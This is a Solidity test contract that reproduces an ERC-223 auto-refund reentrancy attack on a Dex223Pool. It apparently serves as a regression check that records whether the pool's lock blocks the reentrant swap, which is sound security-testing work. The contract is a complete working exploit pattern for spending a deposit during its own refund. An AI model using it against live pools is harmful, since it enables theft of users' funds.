// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;
pragma abicoder v2;

import '../tokens/interfaces/IERC223Recipient.sol';

interface IAttackTarget {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bool prefer223,
        bytes memory data
    ) external returns (int256 amount0, int256 amount1);

    function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;

    function slot0()
        external
        view
        returns (uint160, int24, uint16, uint16, uint16, uint8, bool unlocked);
}

interface IERC223Transfer {
    function transfer(address to, uint256 value, bytes calldata data) external payable returns (bool success);
    function balanceOf(address account) external view returns (uint256);
}

/// @dev Reproduces the ERC-223 auto-refund reentrancy against Dex223Pool.
///
/// The pool credits an `erc223deposit` entry in `tokenReceived`, runs the dispatched payload, and then
/// auto-refunds whatever is left. The refund is itself an ERC-223 transfer, so it calls back into this
/// contract - and historically it did so *before* the deposit entry was cleared and while only the
/// ERC-223-specific lock (not the pool's `lock()`) was held. From that callback the pool's `swap()` was
/// therefore reachable and could spend the very deposit that was being refunded.
contract TestERC223ReentrantAttacker is IERC223Recipient {
    address public pool;
    address public token;      // the ERC-223 token we deposit
    bool public zeroForOne;
    uint160 public sqrtPriceLimitX96;

    bool public reenterOnRefund;
    bool public reentered;
    bool public reentrySucceeded;
    string public reentryError;
    /// @dev `!slot0.unlocked` observed at the instant of the refund callback. Proves the pool-wide lock was
    ///      held when we re-entered, independent of any revert string: the production Dex223Pool is compiled
    ///      with revertStrings stripped, so its `require(slot0.unlocked, 'LOK')` reverts with no reason data
    ///      and `reentryError` reads 'unknown' rather than 'LOK'.
    bool public lockHeldOnReentry;

    function configure(
        address _pool,
        address _token,
        bool _zeroForOne,
        uint160 _sqrtPriceLimitX96
    ) external {
        pool = _pool;
        token = _token;
        zeroForOne = _zeroForOne;
        sqrtPriceLimitX96 = _sqrtPriceLimitX96;
    }

    /// @dev Deposit `amount` into the pool with a payload that deliberately consumes none of it, so the whole
    ///      amount comes back through the auto-refund - which is where we get our reentrant callback.
    function attack(uint256 amount, bool _reenterOnRefund) external {
        reenterOnRefund = _reenterOnRefund;
        reentered = false;
        reentrySucceeded = false;
        reentryError = '';
        lockHeldOnReentry = false;

        // A payload that is a no-op as far as the deposit is concerned.
        bytes memory payload =
            abi.encodeWithSelector(IAttackTarget.increaseObservationCardinalityNext.selector, uint16(1));

        IERC223Transfer(token).transfer(pool, amount, payload);
    }

    function tokenReceived(address, uint256 _value, bytes memory) public override returns (bytes4) {
        // This is the pool refunding us. Try to spend the deposit that has just been paid back.
        if (reenterOnRefund && msg.sender == token && !reentered) {
            reentered = true;
            // Record the lock state before touching it: `slot0()` is an unguarded view, so this read
            // succeeds even while the pool is locked.
            (, , , , , , bool unlocked) = IAttackTarget(pool).slot0();
            lockHeldOnReentry = !unlocked;
            try
                IAttackTarget(pool).swap(
                    address(this),
                    zeroForOne,
                    int256(_value),
                    sqrtPriceLimitX96,
                    false,
                    abi.encode(address(this))
                )
            {
                reentrySucceeded = true;
            } catch Error(string memory reason) {
                reentryError = reason;
            } catch {
                reentryError = 'unknown';
            }
        }
        return 0x8943ec02;
    }
}
